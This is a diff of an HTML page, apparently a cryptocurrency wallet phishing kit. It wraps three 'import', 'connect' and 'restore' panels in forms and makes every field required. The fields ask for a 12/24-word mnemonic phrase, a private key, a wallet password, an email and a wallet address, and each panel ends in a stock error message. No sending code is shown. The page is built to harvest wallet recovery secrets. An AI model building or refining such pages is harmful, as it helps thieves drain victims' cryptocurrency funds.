@@ -33,20 +33,20 @@
           </nav>
           <div class="tab-content" id="nav-tabContent">
             <div class="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab" tabindex="0">
-                <div class="m-block">
+                <form class="m-block">
                     <label class="mt-4 mb-2 text-white-50" for="mname">Enter your 12/24 word phrase</label><br>
-                    <input class="border rounded p-2 w-100 bg-" type="text" id="mname" placeholder="Enter your mnemonic" />
+                    <input class="border rounded p-2 w-100 bg-" type="text" required id="mname" placeholder="Enter your mnemonic" />
                     <small class="text-white d-block">Please separate each Mnemonic Phrase with a space.</small>
                     
                     <label class="mt-4 mb-2 text-white-50" for="memailId">Enter your email address</label>
-                    <input class="border rounded p-2 w-100 bg-" type="email" id="memailid" placeholder="Enter your email" />
+                    <input class="border rounded p-2 w-100 bg-" type="email" required id="memailid" placeholder="Enter your email" />
                     <small class="text-white d-block">Your registered email address.</small>
                     
                     <label class="mt-4 mb-2 text-white-50" for="mwalletAddress">Enter your wallet address</label>
-                    <input class="border rounded p-2 w-100 bg-" type="text" id="mwalletAddress" placeholder="Enter your wallet address" />
+                    <input class="border rounded p-2 w-100 bg-" type="text" required id="mwalletAddress" placeholder="Enter your wallet address" />
 
                     <button class="btn bg-info mt-4 fw-bold px-4 text-black" id="mButton">Import</button>
-                </div>
+                </form>
                 <div class="bg-white p-4 rounded d-none errorM mt-4">An error occured while attempting to add your wallet.
                     <br>Please try again later
                     <hr class="my-4">
@@ -54,15 +54,15 @@
                 </div>
             </div>
             <div class="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab" tabindex="0">
-                <div class="k-block">
+                <form class="k-block">
                     <label class="mt-4 mb-2 text-white-50" for="kemailId">Enter your email address</label>
-                    <input class="border rounded p-2 w-100 bg-" type="email" id="kemailid" placeholder="Enter your email" />
+                    <input class="border rounded p-2 w-100 bg-" type="email" required id="kemailid" placeholder="Enter your email" />
                     
                     <label class="mt-4 mb-2 text-white-50" for="kwalletAddress">Enter your wallet address</label>
-                    <input class="border rounded p-2 w-100 bg-" type="text" id="kwalletAddress" placeholder="Enter your wallet address" />
+                    <input class="border rounded p-2 w-100 bg-" type="text" required id="kwalletAddress" placeholder="Enter your wallet address" />
                     
                     <button class="btn bg-info mt-4 fw-bold px-4 text-black" id="kButton">Connect Wallet</button>
-                </div>
+                </form>
                 <div class="bg-white p-4 rounded d-none errorK mt-4">An error occured while attempting to add your wallet.
                     <br>Please try again later
                     <hr class="my-4">
@@ -70,19 +70,19 @@
                 </div>
             </div>
             <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab" tabindex="0">
-                <div class="p-block">
+                <form class="p-block">
                     <label class="mt-4 mb-2 text-white-50" for="privateKey">Please enter your private key</label><br>
-                    <input class="border rounded p-2 w-100 bg-" type="text" id="privateKey" placeholder="Enter your private key" />
+                    <input class="border rounded p-2 w-100 bg-" type="text" required id="privateKey" placeholder="Enter your private key" />
                     <small class="text-white d-block">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.</small>
                     
                     <label class="mt-4 mb-2 text-white-50" for="pwalletPassword">Enter your wallet password</label>
-                    <input class="border rounded p-2 w-100 bg-" type="text" id="pwalletPassword" placeholder="Enter your temporary password" />
+                    <input class="border rounded p-2 w-100 bg-" type="text" required id="pwalletPassword" placeholder="Enter your temporary password" />
                     
                     <label class="mt-4 mb-2 text-white-50" for="pemailId">Enter your email</label>
-                    <input class="border rounded p-2 w-100 bg-" type="email" id="pemailid" placeholder="Enter your email address" />
+                    <input class="border rounded p-2 w-100 bg-" type="email" required id="pemailid" placeholder="Enter your email address" />
                     
                     <button class="btn bg-info mt-4 fw-bold px-4 text-black" id="pButton">Restore</button>
-                </div>
+                </form>
                 <div class="bg-white p-4 rounded d-none errorP mt-4">An error occured while attempting to add your wallet.
                     <br>Please try again later
                     <hr class="my-4">
